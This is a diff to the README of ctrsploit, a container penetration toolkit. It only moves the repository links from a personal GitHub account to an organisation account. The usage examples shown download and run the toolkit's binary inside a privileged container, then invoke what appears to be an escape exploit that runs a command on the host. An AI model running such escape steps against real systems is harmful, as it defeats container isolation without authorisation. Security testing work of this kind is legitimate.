@@ -4,7 +4,7 @@
 
 ## Pre-Built Release
 
-https://github.com/ssst0n3/ctrsploit/releases
+https://github.com/ctrsploit/ctrsploit/releases
 
 ## Usage
 
@@ -75,7 +75,7 @@ OPTIONS:
 
 ```
 root@host # docker run -ti --rm --security-opt="apparmor=unconfined" --cap-add="sys_admin" busybox
-root@ctr # wget -O ctrsploit https://github.com/ssst0n3/ctrsploit/releases/download/v0.4/ctrsploit_linux_amd64 && chmod +x ctrsploit
+root@ctr # wget -O ctrsploit https://github.com/ctrsploit/ctrsploit/releases/download/v0.4/ctrsploit_linux_amd64 && chmod +x ctrsploit
 root@ctr # ./ctrsploit e ra -c "cat /etc/hostname"
 ```
 
@@ -103,7 +103,7 @@ root@ctr # ./ctrsploit e ra -c "cat /etc/hostname"
 ### Help
 
 ```
-wget -O ctrsploit https://github.com/ssst0n3/ctrsploit/releases/download/v0.4/ctrsploit_linux_amd64 && chmod +x ctrsploit
+wget -O ctrsploit https://github.com/ctrsploit/ctrsploit/releases/download/v0.4/ctrsploit_linux_amd64 && chmod +x ctrsploit
 ./ctrsploit --help
 NAME:
    ctrsploit - A penetration toolkit for container environment
